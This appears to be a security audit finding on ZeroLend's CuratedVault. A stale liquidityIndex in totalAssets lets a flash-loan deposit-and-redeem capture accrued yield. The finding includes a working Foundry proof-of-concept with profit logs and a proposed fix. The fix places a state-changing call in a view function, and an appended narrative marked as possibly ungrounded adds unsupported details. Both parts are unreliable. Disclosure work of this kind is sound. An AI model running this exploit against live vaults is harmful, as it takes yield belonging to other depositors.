---
id: 23183
severity: "High"
---

# An attacker can hijack the Cura

## Description

CuratedVault#totalAssets does not update pool's liquidityIndex at the beginning will cause the matured yield to be distributed to users that do not supply to the vault before the yield accrues. An attacker can exploit this to hijack the CuratedVault's matured yield. CuratedVault#totalAssets does not update pool's liquidityIndex at the beginning
```solidity
3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVault.sol#L368-L3
function totalAssets() public view override returns (uint256 assets) {
    for (uint256 i; i < withdrawQueue.length; ++i) {
        assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);
    }
}
```
Internal pre-conditions
External pre-conditions
Attack Path
Let's have:
• A vault has a total assets of totalAssets
• X amount of yield is accrued from T1 to T2
1. The attacker takes a flash loan of flashLoanAmount
2. The attacker deposits flashLoanAmount at T2 to the vault. Since CuratedVault#totalAssets does not update pool's liquidityIndex, the minted shares are calculated based on the total assets at T1.
3. The attacker redeems all the shares and benefits from X amount of yield.
4. The attacker repays the flash loan.
The cost of this attack is gas fee and flash loan fee. The attacker hijacks flashLoanAmount / (flashLoanAmount + totalAssets) percentage of X amount of yield. X could be a considerable amount when:
• The pool has high interest rate.
• T2 - T1 is large. This is the case for the pool with low interactions.
When X is a considerable amount, the amount of hijacked funds could be greater than the cost of the attack, then the attacker will benefit from the attack.

## Proof of Concept

Due to a bug in PositionBalanceConfiguration#getSupplyBalance that we submitted in a different issue, fix the getSupplyBalance function before running the PoC core/pool/configuration/PositionBalanceConfiguration.sol
```solidity
library PositionBalanceConfiguration {
    function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {
        return self.supplyShares.rayMul(index);
    }
}
```
Run command: forge test --match-path test/PoC/PoC.t.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {console} from 'lib/forge-std/src/Test.sol';
import '../forge/core/vaults/helpers/IntegrationVaultTest.sol';
contract ERC4626Test is IntegrationVaultTest {
    address attacker = makeAddr('attacker');
    function setUp() public {
        _setUpVault();
        _setCap(allMarkets[0], CAP);
        _sortSupplyQueueIdleLast();
        oracleB.updateRoundTimestamp();
        oracle.updateRoundTimestamp();
        uint256 vaultAssets = 10 ether;
        loanToken.mint(supplier, vaultAssets);
        vm.prank(supplier);
        vault.deposit(vaultAssets, supplier);
        vm.prank(attacker);
        loanToken.approve(address(vault), type(uint256).max);
    }
    function testDeposit() public {
        collateralToken.mint(borrower, type(uint128).max);
        vm.startPrank(borrower);
        allMarkets[0].supplySimple(address(collateralToken), borrower, type(uint128).max, 0);
        allMarkets[0].borrowSimple(address(loanToken), borrower, 8 ether, 0);
        skip(100 days);
        oracleB.updateRoundTimestamp();
        oracle.updateRoundTimestamp();
        uint256 vaultAssetsBefore = vault.totalAssets();
        console.log("Vault's assets before updating reserve: %e", vaultAssetsBefore);
        uint256 snapshot = vm.snapshot();
        allMarkets[0].forceUpdateReserve(address(loanToken));
        console.log("Vault's accrued yield: %e", vault.totalAssets() - vaultAssetsBefore);
        vm.revertTo(snapshot);
        uint256 flashLoanAmount = 100 ether;
        loanToken.mint(attacker, flashLoanAmount);
        vm.startPrank(attacker);
        uint256 shares = vault.deposit(flashLoanAmount, attacker);
        vault.redeem(shares, attacker, attacker);
        vm.stopPrank();
        console.log("Attacker's profit: %e", loanToken.balanceOf(attacker) - flashLoanAmount);
    }
}
```
Logs:
Vault's assets before updating reserve: 1e19
Vault's accrued yield: 5.62832773326440941e17
Attacker's profit: 5.11666157569491763e17
Although the yield accrued, the vault's assets before updating reserve is still 1e19.

## Recommendation

Update pool's liquidityIndex at the beginning of CuratedVault#totalAssets
```solidity
function totalAssets() public view override returns (uint256 assets) {
    for (uint256 i; i < withdrawQueue.length; ++i) {
        withdrawQueue[i].forceUpdateReserve(asset());
        assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);
    }
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the CuratedVault contract’s totalAssets view function, which aggregates the balances of all positions in the withdraw queue without first updating the pool’s liquidityIndex (or reserve). Because the liquidityIndex reflects the accrued interest over time, failing to refresh it means the function reports a stale total asset value that does not include the most recent yield. When a user deposits after the yield has accrued, the contract calculates the number of shares to mint based on this outdated totalAssets figure. Consequently, the new depositor receives a larger share of the vault than they should, effectively capturing a portion of the matured yield that rightfully belongs to earlier participants. An attacker can exploit this accounting mismatch by taking a flash loan, depositing the borrowed amount at the moment after yield accrual but before the reserve is updated, and then immediately redeeming the inflated shares. The attacker’s profit equals the fraction flashLoanAmount/(flashLoanAmount+totalAssets) of the accrued yield, which can be substantial when the pool’s interest rate is high or when the time interval between updates (T2‑T1) is large, such as in low‑activity pools. The impact is a direct loss of accrued interest for legitimate users, reducing their expected returns and potentially eroding confidence in the protocol. The issue manifests when the vault’s totalAssets is queried or used for share calculations without a preceding forceUpdateReserve call; from a user’s perspective the UI may show the same vault balance before and after a deposit, yet the underlying accounting has shifted, leading to unexpected zero or reduced refunds. The bug was discovered during a formal audit and reproduced with a proof‑of‑concept test that demonstrated a flash‑loan attacker profiting from the stale index. It is hard to notice because the function is read‑only and appears to simply sum balances, so the missing update step is not obvious without inspecting the interaction between liquidityIndex and share minting logic. The proper remediation is to force an update of the pool’s reserve (or liquidityIndex) at the beginning of totalAssets, ensuring that the reported asset total always reflects the latest accrued yield before any share calculations are performed. This aligns the contract with the expected accounting guarantees of ERC‑4626, where totalAssets must represent the current value of all underlying assets, thereby preventing yield hijacking and preserving fair distribution of interest among all participants.
